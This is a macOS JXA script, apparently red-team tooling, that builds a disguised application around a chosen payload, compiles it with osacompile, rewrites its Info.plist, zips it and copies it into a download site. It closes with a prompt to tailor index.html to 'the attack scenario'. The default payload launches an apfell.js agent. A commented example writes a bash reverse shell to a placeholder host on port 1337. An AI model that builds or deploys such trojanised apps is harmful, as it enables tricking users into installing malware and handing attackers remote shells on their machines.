//Payload to execute 
//CHANGE THIS FOR DESIRED PAYLOAD !!!!
console.log("Make sure to change the variables 'desiredAppName' and 'payload'")
var desiredAppName = "Coolshift"
//var payload = "ps aux > $HOME/Desktop/coolbeans.txt"
var payload = "osascript /Users/Shared/apfell.js &"

/* 
Example payload
var payload = `echo "#!/bin/bash
bash -i >& /dev/tcp/my.site.here.com/1337 0>&1
wait" > $HOME/.security/system.sh`
*/

ObjC.import('Foundation')
ObjC.import('stdlib')
var app = Application.currentApplication();
app.includeStandardAdditions = true; 

function readFile(file) {
    // Convert the file to a string
    var fileString = file.toString()
 
    // Read the file and return its contents
    return app.read(Path(fileString))
}

function writeTextToFile(text, file, overwriteExistingContent) {
    try {
 
        // Convert the file to a string
        var fileString = file.toString()
 
        // Open the file for writing
        var openedFile = app.openForAccess(Path(fileString), { writePermission: true })
 
        // Clear the file if content should be overwritten
        if (overwriteExistingContent) {
            app.setEof(openedFile, { to: 0 })
        }
 
        // Write the new content to the file
        app.write(text, { to: openedFile, startingAt: app.getEof(openedFile) })
 
        // Close the file
        app.closeAccess(openedFile)
 
        // Return a boolean indicating that writing was successful
        return true
    }
    catch(error) {
 
        try {
            // Close the file
            app.closeAccess(file)
        }
        catch(error) {
            // Report the error is closing failed
            console.log(`Couldn't close file: ${error}`)
        }
 
        // Return a boolean indicating that writing was successful
        return false
    }
}

// Setup current directory variable
app = Application.currentApplication();
app.includeStandardAdditions = true;
thePath = app.pathTo(this);
thePathStr = $.NSString.alloc.init;
thePathStr = $.NSString.alloc.initWithUTF8String(thePath);
thePathStrDir = (thePathStr.stringByDeletingLastPathComponent);
var pwd = thePathStrDir.js + "/";

// Replace the script with the payload and create new file with desired payload
oldpscript = pwd+"script.txt"
var oldppayload = readFile(oldpscript)
var payloadModified = oldppayload.replace("ps",payload);
var newPayload = pwd+desiredAppName+".txt"
writeTextToFile(payloadModified, newPayload, true)

// Compile the new script as an app
app.doShellScript("osacompile -l JavaScript -o " +pwd+desiredAppName+".app " +pwd+desiredAppName+".txt")


oldplistlocation = `${pwd}/Info.plist`
var oldplist = readFile(oldplistlocation)
var plistModified = oldplist.replace(/\b[\w*.]security/gi,"."+desiredAppName)
var plistModified2 = plistModified.replace(/\b[>*.]+security/gi,">"+desiredAppName)
var newAppPlist = `${pwd}/${desiredAppName}.app/Contents/Info.plist`
writeTextToFile(plistModified2, newAppPlist, true)


// Modify the download.js placeholder with new App Name
sitePath = pwd+"/"+desiredAppName+"Site"
isDir=Ref()
var sitedirExistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(sitePath,isDir)
if (sitedirExistsCheck == false) {
	console.log("Creating new Site directory..." + desiredAppName+"Site");
	app.doShellScript("mkdir " + pwd+desiredAppName+"Site")
					}
					else {
					console.log("Directory " + desiredAppName+"Site"+ " Already exists")
					}

app.doShellScript("cp -r " +pwd+"securitySite/"+ " "+ pwd+desiredAppName+"Site")

oldredirect = `${pwd}/securitySite/download.js`
var oldURLScheme= readFile(oldredirect)
var newURLScheme1 = oldURLScheme.replace(/coolshift/g,desiredAppName);
var newURLScheme2 = newURLScheme1.replace(/test.txt/g,desiredAppName+".zip");
var newredirect = `${pwd}/${desiredAppName}Site/download.js`
writeTextToFile(newURLScheme2, newredirect, true)

//Add the zip of the app to site folder
app.doShellScript("zip -Xr " +pwd+desiredAppName+".zip" + " "+pwd+desiredAppName+".app/")
app.doShellScript("cp -r " +pwd+desiredAppName+".zip" + " "+pwd+desiredAppName+"Site/")

console.log("Modify the index.html to fit the attack scenario.")
